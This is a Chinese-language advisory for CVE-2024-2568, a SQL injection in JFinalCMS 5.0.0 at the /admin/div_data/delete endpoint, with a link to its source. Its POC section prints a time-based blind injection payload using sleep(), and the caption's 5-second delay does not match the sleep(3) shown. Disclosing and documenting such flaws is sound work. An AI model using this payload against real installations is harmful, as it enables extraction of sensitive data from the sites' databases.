# CVE-2024-2568

>JFinalCMS，极速开发，动态添加字段，自定义标签，动态创建数据库表并crud数据，数据库备份、还原，动态添加站点(多站点功能)，一键生成模板代码。

target:https://gitee.com/heyewei/JFinalcms

version:v5.0.0

## 来源

[https://github.com/bigbigbigbaby/cms/blob/main/5.md](https://github.com/bigbigbigbaby/cms/blob/main/5.md)

## 简介

JFinalCMS 5.0.0中的一个功能在组件Custom Data Page的文件/admin/div_data/delete中存在SQL注入漏洞，授权的用户利用该漏洞获取敏感信息。

## 漏洞类型

SQL注入

## 影响范围

-   JFinalCMS <= 5.0.0

## 漏洞分析


SQL injection exists for custom data tables,url is  /admin/div_data/delete?divId=9


The function is located in, Extended Content - Custom Data

![1](https://github.com/bigbigbigbaby/cms/assets/41852125/689ad6b1-c1bd-41f3-b4bf-645183774ad4)



## POC

```
cms_admin where id =20 or sleep(3) #
```
![3](https://github.com/bigbigbigbaby/cms/assets/41852125/49220f83-9cf5-4bd6-a20a-bc7411143518)


Then obtain the corresponding data packet

![1](https://github.com/bigbigbigbaby/cms/assets/41852125/37003e9a-afe0-473d-91fd-29e2a80f8ddd)


5 second delay with injection present

![4](https://github.com/bigbigbigbaby/cms/assets/41852125/bc79b0eb-c959-4ac3-86de-0436aa848861)
